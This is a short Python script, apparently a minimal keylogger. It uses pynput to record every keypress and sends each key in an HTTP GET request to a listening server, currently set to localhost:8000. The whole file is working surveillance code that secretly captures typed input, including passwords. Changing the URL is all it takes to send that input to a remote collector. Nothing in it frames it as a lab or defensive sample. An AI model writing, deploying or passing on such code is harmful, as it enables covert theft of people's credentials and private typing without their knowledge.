from pynput.keyboard import Listener
import requests

url = "http://localhost:8000"


def pressed(key):
    current_url = url + f"?key={key}"
    requests.get(current_url)
    return 0


listener = Listener(on_press=pressed)
listener.start()

while True:
    listener.join()





